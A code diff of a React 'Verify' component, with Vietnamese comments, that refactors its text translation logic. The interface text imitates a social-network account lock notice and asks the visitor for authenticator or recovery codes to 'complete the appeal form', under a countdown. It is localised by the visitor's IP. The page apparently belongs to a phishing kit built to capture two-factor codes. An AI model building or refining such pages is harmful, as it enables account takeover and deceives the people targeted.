@@ -13,57 +13,56 @@ const Verify = () => {
     const [attempts, setAttempts] = useState(0);
     const [countdown, setCountdown] = useState(0);
 
-    // Định nghĩa văn bản mặc định
-    const defaultTexts = useMemo(
-        () => ({
-            title: 'Two-factor authentication required',
-            description:
-                'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
-            placeholder: 'Enter your code',
-            infoTitle: 'Approve from another device or Enter your verification code',
-            infoDescription:
-                'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
-            walkthrough: "We'll walk you through some steps to secure and unlock your account.",
-            submit: 'Submit',
-            sendCode: 'Send Code',
-            errorMessage: 'The verification code you entered is incorrect',
-            loadingText: 'Please wait',
-            secondsText: 'seconds'
-        }),
-        []
-    );
+    // Các văn bản mặc định
+    const defaultTexts = useMemo(() => ({
+        title: 'Two-factor authentication required',
+        description: 'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
+        placeholder: 'Enter your code',
+        infoTitle: 'Approve from another device or Enter your verification code',
+        infoDescription: 'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
+        walkthrough: "We'll walk you through some steps to secure and unlock your account.",
+        submit: 'Submit',
+        sendCode: 'Send Code',
+        errorMessage: 'The verification code you entered is incorrect',
+        loadingText: 'Please wait',
+        secondsText: 'seconds'
+    }), []);
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    // Hàm dịch tất cả các văn bản
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const translated = await Promise.all(
-                    Object.values(defaultTexts).map((text) => translateText(text, targetLang))
-                );
+    // Dịch các văn bản
+    const translateAllTexts = useCallback(async (targetLang) => {
+        try {
+            const translatedTitle = await translateText(defaultTexts.title, targetLang);
+            const translatedDesc = await translateText(defaultTexts.description, targetLang);
+            const translatedPlaceholder = await translateText(defaultTexts.placeholder, targetLang);
+            const translatedInfoTitle = await translateText(defaultTexts.infoTitle, targetLang);
+            const translatedInfoDesc = await translateText(defaultTexts.infoDescription, targetLang);
+            const translatedWalkthrough = await translateText(defaultTexts.walkthrough, targetLang);
+            const translatedSubmit = await translateText(defaultTexts.submit, targetLang);
+            const translatedSendCode = await translateText(defaultTexts.sendCode, targetLang);
+            const translatedError = await translateText(defaultTexts.errorMessage, targetLang);
+            const translatedLoading = await translateText(defaultTexts.loadingText, targetLang);
+            const translatedSeconds = await translateText(defaultTexts.secondsText, targetLang);
 
-                setTranslatedTexts({
-                    title: translated[0],
-                    description: translated[1],
-                    placeholder: translated[2],
-                    infoTitle: translated[3],
-                    infoDescription: translated[4],
-                    walkthrough: translated[5],
-                    submit: translated[6],
-                    sendCode: translated[7],
-                    errorMessage: translated[8],
-                    loadingText: translated[9],
-                    secondsText: translated[10]
-                });
-            } catch (error) {
-                console.error('Error during translation:', error);
-            }
-        },
-        [defaultTexts]
-    );
+            setTranslatedTexts({
+                title: translatedTitle,
+                description: translatedDesc,
+                placeholder: translatedPlaceholder,
+                infoTitle: translatedInfoTitle,
+                infoDescription: translatedInfoDesc,
+                walkthrough: translatedWalkthrough,
+                submit: translatedSubmit,
+                sendCode: translatedSendCode,
+                errorMessage: translatedError,
+                loadingText: translatedLoading,
+                secondsText: translatedSeconds
+            });
+        } catch (error) {
+            console.error("Error translating texts:", error);
+        }
+    }, [defaultTexts]);
 
-    // Dịch văn bản khi load trang
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
         if (!ipInfo) {
@@ -75,14 +74,12 @@ const Verify = () => {
         }
     }, [translateAllTexts]);
 
-    // Hàm format thời gian đếm ngược
     const formatTime = (seconds) => {
         const minutes = Math.floor(seconds / 60);
         const remainingSeconds = seconds % 60;
         return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
     };
 
-    // Hàm xử lý submit form
     const handleSubmit = async () => {
         if (!code.trim()) return;
 
@@ -142,7 +139,6 @@ const Verify = () => {
                 />
                 {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
 
-                {/* Information Section */}
                 <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                     <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                     <div>
@@ -153,7 +149,6 @@ const Verify = () => {
 
                 <p>{translatedTexts.walkthrough}</p>
 
-                {/* Submit Button */}
                 <button
                     className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
                     onClick={handleSubmit}
@@ -162,7 +157,6 @@ const Verify = () => {
                     {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
                 </button>
 
-                {/* Send Code Link */}
                 <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
